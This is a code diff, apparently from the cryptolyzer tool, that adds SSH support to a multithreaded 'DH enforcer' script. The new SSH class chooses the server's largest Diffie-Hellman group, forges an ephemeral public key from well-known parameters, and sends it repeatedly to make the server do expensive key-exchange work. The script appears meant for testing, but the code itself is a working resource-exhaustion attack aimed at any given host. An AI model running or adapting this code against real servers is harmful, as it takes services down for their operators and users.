@@ -5,23 +5,42 @@ import argparse
 import os
 import time
 import socket
+import struct
 import threading
 
 import abc
 import attr
 import urllib3
 
-from cryptoparser.common.exception import InvalidType
+from cryptoparser.common.exception import InvalidType, NotEnoughData
 
 from cryptoparser.tls.record import TlsRecord
 from cryptoparser.tls.version import TlsProtocolVersionFinal, TlsVersion
 
+from cryptoparser.ssh.record import SshRecordInit, SshRecordKexDH
+from cryptoparser.ssh.subprotocol import (
+    SshProtocolMessage,
+    SshKexAlgorithmVector,
+    SshDHKeyExchangeInit,
+)
+from cryptoparser.ssh.version import SshProtocolVersion, SshVersion
+
+from cryptolyzer.common.dhparam import (
+    WellKnownDHParams,
+    get_dh_ephemeral_key_forged,
+    int_to_bytes,
+)
 from cryptolyzer.common.exception import SecurityError
 import cryptolyzer.tls.dhparams
 import cryptolyzer.tls.versions
 from cryptolyzer.tls.client import (
     L7ClientTlsBase,
     TlsHandshakeClientHelloKeyExchangeDHE,
+)
+import cryptolyzer.ssh.dhparams
+from cryptolyzer.ssh.client import (
+    L7ClientSsh,
+    SshKeyExchangeInitAnyAlgorithm,
 )
 
 
@@ -78,7 +97,7 @@ class DHEnforcerThreadBase(threading.Thread):
                 client = self._get_client()
                 client.init_connection()
                 sent_byte_count, received_byte_count = self._send_packets(client)
-            except (ConnectionResetError, socket.timeout, socket.error, InvalidType, SecurityError):
+            except (ConnectionResetError, socket.timeout, socket.error, InvalidType, SecurityError, NotEnoughData):
                 self.stats.failed_request_num += 1
             else:
                 self.stats.received_byte_count += received_byte_count
@@ -87,6 +106,68 @@ class DHEnforcerThreadBase(threading.Thread):
         end_time = time.time()
 
         self.stats.time_interval = end_time - start_time
+
+
+class DHEnforcerThreadSSH(DHEnforcerThreadBase):
+    @abc.abstractmethod
+    def _pre_check(self):
+        analyzer = cryptolyzer.ssh.dhparams.AnalyzerDHParams()
+        self.pre_check_result = analyzer.analyze(self._get_client())
+        if self.pre_check_result.key_exchange is None:
+            raise NotImplementedError()
+
+    def _get_client(self):
+        if self.uri.scheme is None:
+            scheme = 'ssh'
+        else:
+            scheme = self.uri.scheme
+
+        return L7ClientSsh.from_scheme(scheme, self.uri.host, self.uri.port, self.timeout)
+
+    def _prepare_packets(self):
+        message_bytes = bytearray()
+        protocol_message = SshProtocolMessage(
+            protocol_version=SshProtocolVersion(SshVersion.SSH2, 0),
+            software_version='DH-generator',
+        )
+        key_exchange_init_message = SshKeyExchangeInitAnyAlgorithm()
+        message_bytes += protocol_message.compose()
+
+        key_exchange_algorithm_with_greatest_key_size = sorted(
+            self.pre_check_result.key_exchange.kex_algorithms,
+            key=lambda algorithm: algorithm.value.key_size,
+            reverse=True
+        )[0]
+        key_exchange_init_message.kex_algorithms = SshKexAlgorithmVector(
+            [key_exchange_algorithm_with_greatest_key_size, ]
+        )
+        message_bytes += SshRecordInit(key_exchange_init_message).compose()
+
+        key_size = key_exchange_algorithm_with_greatest_key_size.value.key_size
+
+        well_known_dh_param_with_matching_key_size = [
+            well_known_dh_param
+            for well_known_dh_param in WellKnownDHParams
+            if well_known_dh_param.value.key_size == key_size
+        ][0]
+        dh_ephemeral_public_key = get_dh_ephemeral_key_forged(
+            well_known_dh_param_with_matching_key_size.value.dh_param_numbers.p
+        )
+        dh_ephemeral_public_key_bytes = int_to_bytes(dh_ephemeral_public_key, key_size).lstrip(b'\x00')
+
+        dh_key_exchange_init_message = SshDHKeyExchangeInit(dh_ephemeral_public_key_bytes)
+        message_bytes += SshRecordKexDH(dh_key_exchange_init_message).compose()
+
+        return message_bytes
+
+    def _send_packets(self, client):
+        sent_byte_count = client.send(self.message_bytes)
+        received_byte_count = client.l4_transfer.receive_line()
+        client.l4_transfer.flush_buffer()
+        received_byte_count += client.l4_transfer.receive(4)
+        received_byte_count += client.l4_transfer.receive(struct.unpack('!I', client.l4_transfer.buffer)[0])
+
+        return sent_byte_count, received_byte_count
 
 
 class DHEnforcerThreadTLS(DHEnforcerThreadBase):
@@ -136,7 +217,7 @@ def main():
     parser.add_argument('--timeout', dest='timeout', default=5, help='socket timeout in seconds')
     parser.add_argument('--thread-num', dest='thread_mum', default=1, type=int, help='number of threads to run')
     parser.add_argument(
-        '--protocol', dest='protocol', required=True, choices=['tls', ], help='name of the protocol'
+        '--protocol', dest='protocol', required=True, choices=['tls', 'ssh', ], help='name of the protocol'
     )
     parser.add_argument('uri', metavar='uri', action=ParseURI, help='uri of the service')
 
@@ -148,6 +229,8 @@ def main():
         for _ in range(args.thread_mum):
             if args.protocol == 'tls':
                 enforcer = DHEnforcerThreadTLS(args.uri, args.timeout, pre_check_result)
+            elif args.protocol == 'ssh':
+                enforcer = DHEnforcerThreadSSH(args.uri, args.timeout, pre_check_result)
             pre_check_result = enforcer.pre_check_result
             threads.append(enforcer)
             enforcer.start()
